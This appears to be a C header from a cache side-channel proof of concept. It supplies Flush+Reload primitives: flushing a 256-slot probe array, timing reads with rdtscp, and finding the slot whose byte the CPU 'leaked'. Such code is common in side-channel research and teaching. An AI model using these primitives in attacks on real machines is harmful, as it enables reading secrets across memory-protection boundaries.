#pragma once
#include <stdint.h>
#include <stddef.h>
#include <x86intrin.h>

/* Each probe slot is stride bytes apart so they occupy different cache lines.
   A cache line is 64 bytes; 512 bytes guarantees no false sharing even with
   hardware prefetcher heuristics. */
#define CACHE_STRIDE   512
#define NUM_SLOTS      256
#define CACHE_HIT_NS   80   /* cycles: below this = cache hit */

/* Shared probe array.  Allocated in cache.c, extern'd everywhere. */
extern uint8_t probe_array[NUM_SLOTS * CACHE_STRIDE];

/* Flush every slot out of all cache levels. */
static inline void flush_probe_array(void) {
    for (int i = 0; i < NUM_SLOTS; i++)
        _mm_clflush(&probe_array[i * CACHE_STRIDE]);
    _mm_mfence();
}

/* Time a single read of probe_array[slot].
   Returns cycle count (lower = cached). */
static inline uint64_t probe_slot(int slot) {
    volatile uint8_t *addr = &probe_array[slot * CACHE_STRIDE];
    uint32_t junk;
    uint64_t t1 = __rdtscp(&junk);
    (void)*addr;
    uint64_t t2 = __rdtscp(&junk);
    _mm_clflush((void *)addr);   /* re-flush after probing so next round is clean */
    return t2 - t1;
}

/* After an attack, scan all 256 slots.  Returns the slot with the lowest
   access time (= the byte value the CPU leaked into the cache).
   Also fills 'times' if non-NULL so callers can display raw latencies. */
int find_cached_slot(uint64_t *times);
